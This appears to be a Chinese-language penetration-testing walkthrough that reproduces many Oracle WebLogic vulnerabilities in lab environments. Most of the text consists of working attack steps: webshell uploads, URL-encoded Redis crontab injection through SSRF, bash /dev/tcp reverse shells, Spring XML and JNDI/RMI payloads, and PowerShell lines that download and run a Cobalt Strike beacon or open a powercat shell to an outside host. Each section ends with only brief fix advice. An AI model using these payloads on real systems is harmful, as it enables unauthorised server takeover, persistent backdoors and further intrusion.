CVE-2016-0638：Weblogic 的反序列化的点有三个，黑名单 ClassFilter.class 也作用于 weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream、weblogic.rjvm.MsgAbbrevInputStream.class、weblogic.iiop.Utils.class。通过利用 weblogic.jms.common.StreamMessageImpl 的 readExternal() 也是可以进行反序列化操作的，而且这个不受黑名单限制，所以可以绕过了之前的补丁。

CVE-2016-3510：原理是将反序列化的对象封装进了 weblogic.corba.utils.MarshalledObject，然后再对 MarshalledObject 进行序列化，生成 payload 字节码。反序列化时 MarshalledObject 不在 WebLogic 黑名单里可正常反序列化，在反序列化时 MarshalledObject 对象调用 readObject 时对 MarshalledObject 封装的序列化对象再次反序列化，这样就逃过了黑名单的检查。

CVE-2017-3248：该漏洞就是利用 RMI 机制的缺陷，通过 JRMP 协议达到执行任意反序列化 payload 的目的。使用 ysoserial 的 JRMPListener，这将会序列化一个 RemoteObjectInvocationHandler，该 RemoteObjectInvocationHandler 使用 UnicastRef 建立到远端的 TCP 连接获取 RMI registry。此连接使用 JRMP 协议，因此客户端将反序列化服务器响应的任何内容，从而实现未经身份验证的远程代码执行。

**漏洞版本**

```
- 10.3.6.0
- 12.1.3.0、12.2.1.2-3

```

工具地址如下：

```
https://github.com/0xn0ne/weblogicScanner

```

在 docker 中开启 vulhub 的 CVE-2018-2628 漏洞环境

```
cd vulhub/weblogic/CVE-2018-2628
docker-compose up -d

```

使用工具检测是否存在 CVE-2018-2628 漏洞，结果显示目标存在该漏洞

```shell
 python CVE-2018-2628-poc.py 192.168.0.107 7001

```

![](../../.resource/remote/9c4860145831b928ea045b70fbdd5560e83eb335fff05b6edad0c52dddd56b29.png)

漏洞利用

使用工具直接上传 shell

```shell
python CVE-2018-2628-Getshell.py 192.168.0.102 7001 shell1.jsp

```

![](../../.resource/remote/3e3285b9b12ebb4179d094389ee525033ea86303160dc66155380fb52663b6f8.png)

访问

```
http://192.168.0.107:7001/bea_wls_internal/shell1.jsp?tom=d2hvYW1pCg==，成功执行命令

```

![](../../.resource/remote/ff1226b86d50e9cfdefb5dd72db40717d930fa90a5b9ee60a0e878e1e7aae6da.png)

其中的 d2hvYW1pCg== 为 base64 编码，解码后是 whoami 命令

![](../../.resource/remote/4385343f38144a6b124b31733a84c3960c28f276f7359895789b971d4ed6541a.png)

但是该工具只适合在 Linux 下执行，在 Windows 下执行能够直接上传文件，但访问会返回 500

![](../../.resource/remote/b6e287d61dfdfcc288f5aa17068167c9ece4b5cd0be3f71c5dc9639a45d1246b.png)

因此目标如果是 Windows，可利用 K8 工具来上传 shell

![](../../.resource/remote/37a7b9e94964959a9e607efc6a3002b4f05f3a84a7fe1c012bd3876eca44b8c3.png)

利用脚本执行连接上传的 shell

```shell
python cve-2018-2628.py
> http://192.168.0.105:7001/bea_wls_internal/wlscmd.jsp

```

![](../../.resource/remote/fa7ef0ef0fb15b3e908c6ef79cf68d48a8b00b934ab004784c1071d40e97b345.png)

**漏洞修复**

过滤 T3 协议，在 base_domain 中选择安全》筛选器〉weblogic.security.net.ConnectionFilterImpl，保存后重启 Weblogic

安装漏洞补丁，但 CVE-2018-2628 的补丁经测试后还是能够绕过

**任意文件上传漏洞（CVE-2018-2894）**

**漏洞详情**

WebLogic 管理端未授权的两个页面存在任意上传文件漏洞，利用该漏洞可直接获取权限。两个页面分别为 / ws_utc/begin.do、/ws_utc/config.do。其在开发模式下可直接访问到管理端，但在生产模式则需要经过身份认证并且不存在该漏洞。

**影响版本：**

```
10.3.6
12.1.3、12.2.1.2、12.2.1.3

```

**漏洞利用**

访问 Windows 下搭建的 Weblogic 12 版本，输入账号密码后可登录后台管理界面

![](../../.resource/remote/7687e84cc89d3c57b83cb78c378edb0ca281bc8d0dbcb55fb373685930c1b515.png)

在后台中未发现 / ws_utc/begin.do 和 / ws_utc/config.do 这两个界面，需要在配置中开启 web 服务测试页后才能够访问，点击保存并激活更改后重启 Weblogic

![](../../.resource/remote/79780a641dd0c97dd309988d2c1834cce2039755f7e615d6a0c64360b790cab1.png)

重启完成后成功访问界面 / ws_utc/begin.do，但仍然需要身份验证，这是生产模式和开发模式的区别，输入账号密码后进入 web 测试页面，其中没有文件上传口，说明生产模式下不存在该漏洞

![](../../.resource/remote/505403fcfcd411ee17116c9b0e504adcc853b30375aa09ec504895600d90a408.png)

把 Weblogic 修改为开发模式后，访问 / ws_utc/begin.do 界面

![](../../.resource/remote/5c34c81b377e863f07b4d34584a9cff7b43cf904f9de4dcf051d892d3a8abe73.png)

成功找到文件上传点，在其中直接上传文件

![](../../.resource/remote/f248380a4b43851ca3d2a9948c139a7f149c3daf28df7c042706a02fd3f20d43.png)

抓包后发现其中存在安全配置，虽然在返回包中能看到相应的路径，但是无法访问，当然这里其实是可以上传的，在后面 vulhub 中的实例会解答

![](../../.resource/remote/075b5350e3637000f60a60f22c076bfada97ff31831e2d93f5447407f916a8f5.png)

进入 / ws_utc/config.do 界面

![](../../.resource/remote/b95f3b17347d9dde4db8c751d4ce550af81f94162f6b14e6dca91e73e42b8013.png)

将当前文件目录修改为

C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css 后提交

![](../../.resource/remote/43392d12add49b4a107e1250122e191fa5d52116d77e7946b30a3e2bbb82808f.png)

**在安全选项中点击添加并选择木马尝试上传**

![](../../.resource/remote/2a9eaab068c07ff31fff9264c8108b96f9f65b8ff1e7e5a434510d4bced75d4b.png)

提交后查看页面源码，成功发现其中的 id，它对应的其实就是时间戳

![](../../.resource/remote/911ff74e48804b79f6ef44d881bc221843b57e3ff0c0c49d0f3606650ba1f414.png)

把这个 id 与木马原名称拼接，访问

/ws_utc/css/config/keystore/1638725748360_JspSpy.jsp 成功

![](../../.resource/remote/96c2b79bf137d288a3a7f8036001cfb20a8db6ad043fcc8193cde8fbfd2142e3.png)

输入密码 ninty，进入木马管理界面

![](../../.resource/remote/074f129e781c36c60517019accc7d3fdb24f8fc84141501e4ff2daad5e90b035.png)

接下来测试 vulhub 环境，其中 Weblogic 的密码为 EfWP0enw，如果不知道可在靶机中运行如下命令：

```shell
sudo docker-compose logs | grep password

```

![](../../.resource/remote/2a6e54579148d928e4dd46eb1a232655700662509c717116eee5f51f40a04d47.png)

进入控制台后还是和之前一样开启 web 测试页

![](../../.resource/remote/667c20f87e4818e8473eba9c22e0b7f966deda201bf51041f1f77c232bf9002c.png)

保存后访问 ws_utc/begin.do，在其中上传木马

![](../../.resource/remote/bfc283189e0dff9fa99c7895855e9a40973278e5f7c9dc83b065c66090d42922.png)

使用 BurpSuite 成功抓取到文件上传数据包如下：

![](../../.resource/remote/cc0ae9b143021542550ba6f0ee30b582cea96076bf41810124c9802d39a62d6b.png)

虽然显示 500 错误，但是在响应包中存在路径 / ws_utc/css/upload/RS_Upload_2021-12-05_18-22-05_785/import_file_name_JspSpy.jsp，还是出现和上面一样的问题，但其实我们只需要设置上传路径即可解决这个问题。进入 / ws_utc/config.do 界面，设置当前工作目录为

```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css

```

![](../../.resource/remote/b8fa35cfa78ba2ce39be9b494a57c23af2d211d991010ef514012c88ae83e6cb.png)

重发木马上传请求包，在响应中返回路径发生变化

![](../../.resource/remote/d419038af0941854c0ca3831247fc3738dd49d7e617e9708712526326911e4e7.png)

该路径就是 config.do 界面中设置的工作目录，访问

```
/ws_utc/css/upload/RS_Upload_2021-12-05_18-37-15_307/import_file_name_JspSpy.jsp

```

发现木马已存在

![](../../.resource/remote/b988b78ebf682704ce4bc1f47ce18d8375a7406ce40011d2efc4a65af35d72f2.png)

而 config.do 的利用与以上 Windows 环境一样，在安全中设置 keystore 并点击提交

![](../../.resource/remote/506dfa6b486122a4ac55cfa5bb66b5b4218b642b4196614f52624876aa803ee3.png)

查看页面源代码找到对应 id

![](../../.resource/remote/6d9c7026238a74f5904d782cbec25073f929fd9dfbd16efc0d732457f010f16d.png)

访问 / ws_utc/css/config/keystore/1638727126207_JspSpy.jsp，成功 getshell

![](../../.resource/remote/0185d20cae057b6c32580736013ff678d6fd076ee5274409f53ea398193c9ca1.png)

**漏洞修复**

1. 设置 config.do、begin.do 页面登录授权后访问

2.IPS 等防御产品可以加入相应的特征

3. 升级到官方最新版本

**SSRF 漏洞（CVE-2014-4210）**

**漏洞详情**

WebLogic 的 SearchPublicReqistries.jsp 接口存在 SSRF 漏洞，如果服务端或内网中存在 Redis 未授权访问漏洞等可进一步打漏洞组合拳进行攻击。

**影响版本：**

```
10.0.2
10.3.6

```

**漏洞利用**

验证漏洞只需要直接访问 / uddiexplorer / 接口，出现如下界面说明漏洞存在

![](../../.resource/remote/793ff9d12747e81db45e46768eff15989156a4cdac19e28cf5188e3f50443846.png)

为了方便验证 SSRF 漏洞，把环境切换至 vulhub 当中，其自带 redis 未授权访问漏洞。存在漏洞接口为 Search Public Registries

![](../../.resource/remote/8d8cfe38f24f08f0781c0fe32f21265a80b741a97a6d25ec49ea83f889ba7a8e.png)

点击 Search 通过 BurpSuite 抓取数据包

![](../../.resource/remote/3204b1c214b90a697419972bb3d5113e4dbb7f7b4e116f42c9889d9df785c385.png)

更换请求方式为 GET，在漏洞点 operator 中设置一个不存在的端口，比如 http://127.0.0.1:80

![](../../.resource/remote/7215c2d77f6135d7b24d6fadc021189bcbf99d1ebc86d0e36f0dde520992dae6.png)

果不其然响应包显示存在错误，接下来在漏洞点 operator 中设置一个存在的端口，比如 http://127.0.0.1:7001

![](../../.resource/remote/66d1cdaf26015c5eb588171782e43d8f972405a71327cd9f9bea4856aa94e3c9.png)

响应包显示访问状态码 404，说明端口开放和关闭的响应结果有所不同。因此可根据相应内容判断目标的端口服务是否开放，从而利用 SSRF 进行攻击。

**结合 redis 未授权访问**

探测内网是否存在 redis 服务，修改漏洞点路径为 http://172.24.0.2:6379

![](../../.resource/remote/fef4aa4b3f3661501c2c017eaacde3a3891ea98617b0dfeb915124989c7a07f6.png)

出现与以上两种都不同的提示，说明端口是开放的，但使用的协议不是 http，因此在 172.24.0.2 中开放着 Redis 服务，尝试写入计划任务执行反弹 shell

```
set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'bash -i >& /dev/tcp/172.24.0.1/6666 0>&1'\n\n\n\n"config set dir /etc/config set dbfilename crontabsave

```

经 URL 编码如下：

```
set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.24.0.1%2F6666%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave

```

放到漏洞点当中，注意在前面和后面分别添加 %0D%0A%0D%0A 来实现 HTTP 头 CRLF 注入

![](../../.resource/remote/abcdbcebc4b836936fc77ff594f9eff91883bb633803f910948177cf839f6a52.png)

完成后可进入靶机进行查看，在 docker 中查看容器 ID

```shell
docker ps

```

![](../../.resource/remote/24f28461a650b7d9ee10f7ba9c12cd0338530c7c22166b89602b2d7868ca6b50.png)

发现 c6f7 开放 Weblogic 服务，其 IP 地址为 172.24.0.2；而 7704 开放 redis 服务，其 IP 地址为 172.24.0.3，进入 7704 查看计划任务

```shell
docker exec -it 7704 bash
cd /etc/
cat crontab

```

![](../../.resource/remote/1b7315163edb7caba3dbbe8ce7d1baae1d98fd30753567342f5a5fd2eea10e1c.png)

发现计划任务已经写入，在本机（172.24.0.1）中开启 nc 监听可成功收到反弹 shell

```shell
nc -nvlp 6666

```

![](../../.resource/remote/349bb68e50d90e222aa67abe403ab4cb15e919fb85b1df28393e73dbfeca80c7.png)

**计划任务写入技巧：**

/etc/crontab: 负责调度各种管理和维护任务

/etc/cron.d/*: 将任意文件写到该目录下，效果和 crontab 相同，格式也要一致，并且在该目录操作可以做到不覆盖任何其他文件的情况进行弹 shell

/var/spool/cron/root: CentOS 系统下 root 用户的 cron 文件

/var/spool/cron/crontabs/root: Debian 系统下 root 用户的 cron 文件

**漏洞修复**

升级 Weblogic 版本

**weblogic 后台弱口令 && getshell**

**漏洞详情**

利用爆破手段拿到控制台密码，在爆破时注意如果存在特殊字符需进行 URL 编码

![](../../.resource/remote/079176e1295f1282eebf349f67caafc02df9d9de697b1b26918aed178cb42108.png)

在控制台中找到部署选项，开始上传 war 包

![](../../.resource/remote/e4109bfdbf939626a469d00f46f794add9d0afd7914500c068e9e98a44a72e38.png)

选择文件进行上传，一直下一步直到完成上传

![](../../.resource/remote/0ac29ea4c5c0a53c2c0d32eaccb68137467a8c1680383f285289e0b9bc08d43b.png)

![](../../.resource/remote/83c448664a5c225fc46e07d77039ae66b44aa57bfc571603b6d74d74a9152b5a.png)

![](../../.resource/remote/379f5bbbb0ddd5a77b0f224b6fb94987e6ebac10a72517bc3156098bf5c05db4.png)

![](../../.resource/remote/86dfc285cc6b68a97a81032e06d4bf0f9f46f0df26ec77b95a3360ee849de8dc.png)

    部署成功后存在该应用并点击启动

![](../../.resource/remote/1e36dc3ca234c1b4eaf2d9fc37e556f91b5ed9389582e0cb4eee59dca8550339.png)

访问木马 http://192.168.0.105:7001/JspSpy/JspSpy.jsp 成功

![](../../.resource/remote/8ee9a3d0bd844fe14478edf1418686d8db10912d4851370e376a749e0b5dd3ec.png)

**漏洞修复**

设置强口令，杜绝弱口令

**Console HTTP 协议远程代码执行漏洞（CVE-2020-14882/3）**

**漏洞详情**

组合利用 CVE-2020-14882、CVE-2020-14883 可使未经授权的攻击者绕过 Weblogic 后台登录等限制，最终远程执行代码接管 Weblogic 服务器。这两个漏洞均存在于 Weblogic 的控制台中，利用组件为 Weblogic 全版本自带组件，并且通过 HTTP 协议进行利用。其中 CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。

**影响版本：**

```
10.3.6.0.0
12.1.3.0.0、12.2.1.3.0、12.2.1.4.0
14.1.1.0.0

```

**漏洞利用**

使用 vulhub 搭建漏洞环境

```
cd vulhub/weblogic/CVE-2020-14882
docker-compose up -d

```

其中 CVE-2020-14882 的 POC 如下，访问后可绕过限制进入控制台

```
/console/images/%252E%252E%252Fconsole.portal

```

![](../../.resource/remote/7fd3c08df49f2c5a975eb749eba53b83961f25248efa2fe108e237609d9ceed8.png)

而 CVE-2020-14883 的 POC 如下，执行后可写入文件至 Weblogic 服务器当中，执行后显示 404

```
/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/mac.txt%27);%22);

```

![](../../.resource/remote/61fbc5eb97527a79b0661caf502ce77ef85ca6b752c1002d342776c70cdf04d2.png)

在服务器中查看发现文件已成功写入 / tmp 目录

![](../../.resource/remote/0ff2307aafabbf4b877e7a42699a31a557a0d702ebb1920cf585f4d3416a00f9.png)

**Linux 反弹 shell**

构造用于执行 payload 的 XML 文档如下：

```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/bash</value>
        <value>-c</value>
        <value><![CDATA[bash -i >& /dev/tcp/192.168.0.50/6666 0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>

```

在本地开启 http 服务并监听 6666 端口

```shell
python -m SimpleHTTPServer 80

```

请求执行 XML 中的反弹 shell 命令

```
/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://192.168.0.101/poc-bash.xml")

```

![](../../.resource/remote/2984e9ce56dd1aa5aa237cfa5df02ce9889ba33fd6c8126b3ce2232049d3fb39.png)

成功拿到反弹 shell

![](../../.resource/remote/0319bf3fc6d007efbe6e7cac7d7bda419624603e64568c5974057bc19d14c83d.png)

**Windows 上线 CS**

同样构造用于执行 payload 的 XML 文档如下：

```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[calc.exe]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>

```

请求执行 XML 中的计算机命令

```
/console/css/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.0.101/poc-calc.xml")

```

![](../../.resource/remote/db8b92f37de9a437370ff03ef7e1fd7e562c98f79394ee5b1d5fb4733a2f5c0c.png)

在 Windows 系统中成功弹出计算机

![](../../.resource/remote/f256a2b703f159f6eb07da56070a7ab95d2a26c962c25df39711a32f70765f93.png)

既然可以执行普通程序，那么上线 CS 自动也没什么问题，修改利用请求如下：  

```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.0.106/mac.exe','mac.exe');start-process mac.exe]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>

```

执行后成功上线 CS，但默认会执行多次程序，从而导致上线多个会话

![](../../.resource/remote/10199700e5bd2d772267e2c593ac958d559f6344c06d97d93d08b7e4fef00245.png)

**漏洞修复**

目前 Oracle 官方已发布了最新针对该漏洞的补丁，请受影响用户及时下载补丁程序并安装更新。

在旧版补丁中，使用黑名单过滤，可使用大小写绕过，请更新最新版的补丁，或者如无使用必要可选择关闭 console。

**IIOP 反序列化漏洞（CVE-2020-2551）**

**漏洞详情**

该漏洞的出现主要在核心组件当中，影响协议为 IIOP，它类似于 RMI 反序列化漏洞（CVE-2017-3241），都是由于调用远程对象的实现存在缺陷，导致反序列化可以任意构造，并且没有进行安全检查所致。攻击者可以通过 IIOP 协议远程访问 Weblogic 服务器上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下完成 RCE。IIOP 协议以 Java 接口的形式对远程对象进行访问，默认为启用状态。当然其影响版本与 Java 和 Weblogic 都有关，经测试在 10.3.6 和 12.1.3 版本下成功复现

**漏洞利用**

利用该漏洞需要准备如下四个文件：

![](../../.resource/remote/4e61ee70b12d728c18f2fe31fbcabe306803a343845fcd96bd776a1d70ed6724.png)

在 exp.java 中发现其调用计算器程序

```python
import java.io.IOException;
public class exp {
  static{
    try {
      java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
  public static void main(String[] args) {
  }
}

```

在 kali 中安装 javac 以用于将 java 源文件编译为 class 字节码文件

```
cd /opt
curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz
tar zxvf jdk-8u20-linux-x64.tar.gz
rm -rf /usr/bin/java*
ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
javac -version
java -version

```

![](../../.resource/remote/36fbbc8238a67c792d42e32fc089725958a3ce65a9c5f1d25e90714a08a8f4f1.png)

编译 exp.java 后在当前目录启用 http 服务

```
javac exp.java -source 1.6 -target 1.6
## 启动web服务
python -m SimpleHTTPServer 80 或
python3 -m http.server 80

```

![](../../.resource/remote/a33347077295bd6314a163baf6f81553513c50085a91efc521ac3581ac53d7a8.png)

通过 maeshalsec 启动恶意的 RMI 服务，开放端口为 1099

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.50/#exp" 1099

```

![](../../.resource/remote/c0eb9386c6f344f74a227f8d540d5a6ca6256b31edf72bb7fd0dedafcb7ca16b.png)

执行漏洞利用脚本请求 RMI 服务进行攻击

```
java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.50:1099/exp

```

![](../../.resource/remote/31d07d1472053a9b5adcdc59a2329f19ef78829246a70c9086058628e65403cb.png)

成功在 10.3.6 版本的 Weblogic 服务器中弹出计算器

![](../../.resource/remote/6f6ef37c525c080ba5666b631ac53d8d6ec8241bb3489011e10e9128010f47b1.png)

接下来测试 12.1.3 版本的 Weblogic 是否存在该漏洞，执行漏洞利用程序进行攻击

```
java -jar weblogic_CVE_2020_2551.jar 192.168.0.111 7001 rmi://192.168.0.50:1099/exp

```

![](../../.resource/remote/a7ad82fa7d2ceae7628f98ae91c7a419f9a0867583a25959e4fa4cdfa4f2e68a.png)

同样在服务器上弹出计算器，说明在 12.1.3 版本中也存在该漏洞

![](../../.resource/remote/e0fec0ddf433ca002d4ba79b4f245f6eeed88d8dbcc5bb9f20873cbccf14fed8.png)

把 exp.java 中执行的计算器程序修改为 CS 木马程序

```
java.lang.Runtime.getRuntime().exec(new String[]{"powershell","/c","(new-object System.Net.WebClient).DownloadFile('http://192.168.0.106/mac.exe','mac.exe');start-process mac.exe"});

```

![](../../.resource/remote/48f81e1b85c54b34ff5f83e9139f2ad45c725247ba7444a94393b25d8a12980b.png)

使用 javac 再次编译 exp.java 并开启 http 服务

```
javac exp.java -source 1.6 -target 1.6
python -m SimpleHTTPServer 80

```

![](../../.resource/remote/c449d2f95f7b9cb33d076d7937b9834a8ea13541501c423c9cfdd1e082d38349.png)

执行漏洞利用程序请求恶意 RMI 服务

```
java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.50:1099/exp

```

成功执行木马并上线 CS

![](../../.resource/remote/ce3b68e56d71d63786815335cc7c3024bb241dbb18e34ad97cc9a5bb02050e4a.png)

当然也可以使用 powershell 命令来替代，同样能够上线 CS

```
IEX (New-Object System.Net.Webclient).DownloadString('http://www.naturali5r.cn/powercat.ps1'); powercat -c 192.168.121.1 -p 6666 -e cmd

```

**漏洞修复**

1. 修改 weblogic 的默认端口名为 8080，可在 config.xml 文件中添加 8080

2. 使用 Oracle 官方安全补丁进行修复

3. 如果不依赖 T3 协议进行 JVM 通信，用户可通过控制 T3 协议的访问来临时阻断针对该漏洞的攻击

**Weblogic LDAP 远程代码执行漏洞（CVE-2021-2109）**

**漏洞详情**

攻击者可构造恶意请求，造成 JNDI 注入，执行任意代码，从而控制服务器。

**漏洞利用**

验证漏洞是否存在的路径为

/console/css/%252e%252e%252f/consolejndi.portal，如果出现以下页面说明可未授权访问

![](../../.resource/remote/6dc1f429b3e2805c4ce869dea6d29b128f58839d892120e581b8173c7206b60e.png)

启动攻击所需要的 LDAP 利用脚本，其中 - i 指向当前服务器 IP 

脚本地址：  

```
https://github.com/feihong-cs/JNDIExploit/releases/tag/v.1.11

```

```
java -jar JNDIExploit-v1.11.jar -i 192.168.0.106

```

![](../../.resource/remote/a38e8c858f652373e48a390905fafff2b58fa1e13ab8cf5690395d88d8426211.png)

配合 Weblogic 未授权验证远程代码执行漏洞是否存在，验证成功返回用户名

```
/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.0;106:1389/Basic/WeblogicEcho;AdminServer%22)

```

![](../../.resource/remote/31ffd06188699c8f6b695b4e57867ed279b6f81cee79a46fd7ea75e9ac01f537.png)

修改 cmd 请求头命令如下，尝试上线 CS

```
powershell /c (new-object System.Net.WebClient).DownloadFile('http://192.168.0.106/mac.exe','mac.exe');start-process mac.exe

```

![](../../.resource/remote/c712cc90a89375afd0b66f7b5120c75719b2db619c4afa26b27c272fb39f72cf.png)

成功上线 CS

![](../../.resource/remote/bccb1064308ea50e131d7dda2507ee4414e294fb197bf7fd10dadb04cc5a8a31.png)

**漏洞修复**

1. 禁用 T3 协议，如果您不依赖 T3 协议进行 JVM 通信，可通过暂时阻断 T3 协议缓解此漏洞带来的影响。首先进入 Weblogic 控制台，在 base_domain 配置页面中，进入 “安全” 选项卡页面，点击“筛选器”，配置筛选器。在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入：* * 7001 deny t3 t3s

![](../../.resource/remote/4787328448005bca7ddc0ef367773e1965b68c995d48d78a5e4d03f3bb604331.png)

2. 禁止启用 IIOP 协议。登陆 Weblogic 控制台，找到启用 IIOP 选项，取消勾选后重启生效

![](../../.resource/remote/6a51f0d7d16ecbcbf18b474cbe8042fc3cd476c1e472104d70f124182c4cd8a1.png)

3. 临时关闭后台 / console/console.portal 对外访问

4. 升级官方安全补丁

### **0x04 **知识星球****

![](../../.resource/remote/409b0e82762d87ba3cc9bbdb168654cdbb0ef34798f03e3007aea6cd254b44dd.jpg)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
